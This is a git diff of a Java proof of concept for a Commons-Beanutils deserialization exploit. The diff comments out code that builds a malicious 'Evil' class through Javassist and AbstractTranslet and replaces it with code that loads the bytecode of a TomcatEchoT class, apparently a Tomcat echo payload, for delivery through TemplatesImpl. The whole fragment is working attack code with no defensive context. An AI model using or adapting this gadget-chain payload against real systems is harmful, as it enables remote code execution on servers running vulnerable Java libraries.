@@ -13,15 +13,19 @@ import java.util.PriorityQueue;
 
 public class CommonsBeanutilsPoc {
     public byte[] getEvilBytes() throws Exception {
-        ClassPool pool = ClassPool.getDefault();
-        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
-        CtClass ctClass = pool.makeClass("Evil");
-        ctClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));
+//        ClassPool pool = ClassPool.getDefault();
+//        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
+//        CtClass ctClass = pool.makeClass("Evil");
+//        ctClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));
+//
+//        String staticCmd = "System.out.println(\"you are hacked\");";
+//        ctClass.makeClassInitializer().insertBefore(staticCmd);
+//        byte[] bytes = ctClass.toBytecode();
+//        return bytes;
 
-        String staticCmd = "System.out.println(\"you are hacked\");";
-        ctClass.makeClassInitializer().insertBefore(staticCmd);
-        byte[] bytes = ctClass.toBytecode();
-        return bytes;
+        ClassPool pool = ClassPool.getDefault();
+        CtClass clazz = pool.get(TomcatEchoT.class.getName());
+        return clazz.toBytecode();
     }
 
     public TemplatesImpl getTemplatesImpl() throws Exception{
